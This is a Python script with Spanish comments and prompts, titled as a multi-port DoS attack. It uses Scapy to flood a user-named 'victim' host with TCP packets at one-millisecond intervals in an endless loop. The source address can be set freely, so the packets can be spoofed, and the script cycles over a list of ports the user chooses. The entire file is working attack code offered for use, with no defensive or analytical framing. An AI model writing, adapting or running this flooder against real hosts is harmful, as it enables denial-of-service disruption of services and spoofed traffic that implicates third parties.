#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                        ATAQUE DOS MULTIPLES PUERTOS

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

from scapy.all import *
import sys
from termcolor import colored       #Libreria para colores

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Que no muestre warning


def entrada_ip(texto):
    try:
        # Capturamos la direccion del host a analizar
        ip_destino = input(colored(texto, 'blue'))
        # Si no hay contenido, analizaremos localhost
        if ip_destino == "":
            ip_destino = '127.0.0.1'
        return ip_destino

    except Exception as e:
        print(colored('Error en la direccion introducida. %s' %e, 'red'))


def ataque_mpuertos(src, victima, puertos_ataque):
    numero_paquete = 1
    while True:
        for puerto in puertos_ataque:
            IP_ataque = IP(src=src, dst=victima)
            TCP_ataque = TCP(sport=int(puerto), dport=int(puerto))
            pkt = IP_ataque / TCP_ataque
            send(pkt, inter=.001)
            print(colored("Paquete enviado numero: ", 'cyan'), numero_paquete, colored(" enviado al puerto: ", 'cyan'), puerto)
            numero_paquete = numero_paquete + 1


def main():

    print(colored("\n###############################################################################", 'green', attrs=['bold', 'blink']))
    print(colored("\n         Ataque DOS a multiples puertos\n", 'green', attrs=['bold', 'blink']))
    print(colored("###############################################################################\n", 'green', attrs=['bold', 'blink']))

    src = entrada_ip("Introduzca la direccion de origen, INTRO para usar localhost: ")
    victima = entrada_ip("Introduzca el host victima: ")
    puertos_ataque = input("Introduzca los puertos a los que dirigir el ataque, separados por comas: ")
    puertos_ataque.replace(" ", "")
    puertos_ataque = puertos_ataque.strip().split(',')

    try:
        ataque_mpuertos(src, victima, puertos_ataque)

    except KeyboardInterrupt:
        print("[*] Peticion del usuario para cerrar...")
        print("[*] Saliendo...")

    except:
        print(colored("Error en los datos introducidos.", 'red'))

    repite_consulta = input(colored("\nDesea repetir la consulta? (s/n): ", 'magenta', attrs=['bold']))
    if repite_consulta == 'n':
        sys.exit(1)
    else:
        main()


"""
Programa principal
"""
if __name__ == "__main__":
    main()
